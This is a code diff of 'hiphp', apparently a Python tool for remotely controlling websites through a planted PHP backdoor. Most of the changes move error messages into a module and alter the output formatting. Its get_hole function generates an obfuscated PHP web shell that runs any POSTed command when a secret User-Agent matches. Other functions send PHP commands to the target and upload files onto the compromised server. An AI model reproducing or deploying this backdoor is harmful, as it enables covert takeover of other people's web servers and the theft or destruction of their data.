@@ -7,6 +7,7 @@
 from hiphp.hiphpcoding import rot13,tobase64,tomd5
 from hiphp.hiphpphpfunctions import *
 from hiphp.hiphphelp import help
+from hiphp.hiphpmsgs import *
 from ashar import *
 from hexor import *
 from asciitext import *
@@ -55,14 +56,18 @@ class hiphp:
 {spas}║   ║ ═╦═ ▀█████████▀  ▀▀███▀▀▀▀███▀  ▀█████████▀  
 {spas}╠═══╣  ║    ███          ███    ███     ███        
 {spas}║   ║  ║    ███          ███    ███     ███        
-{spas}╩   ╩ ═╩═  ▄████▀        ███    █▀     ▄████▀ V0.2.15\n""",self.c_red)
-            logo+=self.color.c(" "*36+"Code by -> ",self.c_yellow)+self.color.c("yasserbdj96\n",self.c_green)
+{spas}╩   ╩ ═╩═  ▄████▀        ███    █▀     ▄████▀  V0.2.18\n""",self.c_red)
+            logo+=self.color.c(" "*37+"Code by -> ",self.c_yellow)+self.color.c("yasserbdj96\n",self.c_green)
             logo+=self.color.c("\n - You are now connected safety. You can print the PHP commands below for comprehensive control of the site.\n",self.c_blue)
             logo+=self.color.c(" - If you are having difficulties controlling the program, you can type '--help' for more informations.\n",self.c_yellow)
             logo+=self.color.c(" - '--exit' OR 'Ctrl+C' for exit :)\n\n",self.c_yellow)
             self.do_x+=1
         #
-        getcwd=self.color.c(hiphp.do(self,self.key,self.url,self.headers,True,"echo getcwd();"),self.c_green)
+        reee=hiphp.do(self,self.key,self.url,self.headers,True,"echo getcwd();")
+        if emsg_1 in reee:
+            return reee
+        else:
+            getcwd=self.color.c(reee,self.c_green)
         #
         xxr1=self.color.c('┌──(',self.c_blue)
         xxr2=self.color.c(')──[',self.c_blue)
@@ -134,7 +139,7 @@ class hiphp:
             else:
                 hiphp.do(self,self.key,self.url,self.headers,False,command)
         else:
-            self.color2.c("Command not found!",self.c_red)
+            self.color2.c(emsg_2,self.c_red)
         hiphp.cli(self)
 
     #do:
@@ -164,10 +169,13 @@ class hiphp:
                     if len(response_text)!=0:
                         print(response_text)
             else:
-                hexor().c("We were unable to recognize the hiphp identifier.","#ff5b3c")
-                exit()
+                if retu==True:
+                    return emsg_1
+                else:
+                    hexor().c(emsg_1,self.c_red)
+                    exit()
         else:
-            hexor().c("We were unable to connect '"+url+"'.",self.c_red)
+            hexor().c(emsg_3+" '"+url+"'.",self.c_red)
             exit()
 
     #run_file:
@@ -192,7 +200,7 @@ class hiphp:
                 print(result)
             return result
         else:
-            self.color2.c("The file you entered does not exist.",self.c_red)
+            self.color2.c(emsg_4,self.c_red)
 
     #run:
     def run(self,command):
@@ -213,15 +221,20 @@ class hiphp:
                 hiphp.run(self,"if(!file_exists('"+p+to+"')){mkdir('"+p+to+"',0777,true);}")
             hiphp.run(self,f'Fwrite(fopen("{p+to+os.path.basename(path_to_upluad)}","w+"),base64_decode("{encoded_string}"));')
         except:
-            self.color2.c(f"We could not upload the file '{path_to_upluad}'.",self.c_red)
+            self.color2.c(f"{emsg_5} '{path_to_upluad}'.",self.c_red)
 
     #get the hole:
     def get_hole(self):
         code="if($_SERVER['HTTP_USER_AGENT']=='"+self.key+"'){echo'#"+self.key+"';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
         code=rot13(tobase64(rot13(tobase64(rot13(code)))))
-        code=f"/*php code start*/\neval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('{code}'))))));\n/*php code end*/"
+        code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('{code}'))))));"
+        php_s="/*php code start*/"
+        php_e="/*php code end*/"
         if self.retu==True:
-            return code
+            return php_s+"\n"+code+"\n"+php_e
         else:
-            print(code)
+            self.color2.c(msg_1,self.c_yellow)
+            self.color2.c(php_s,self.c_red)
+            self.color2.c(code,self.c_green)
+            self.color2.c(php_e,self.c_red)
 #}END.
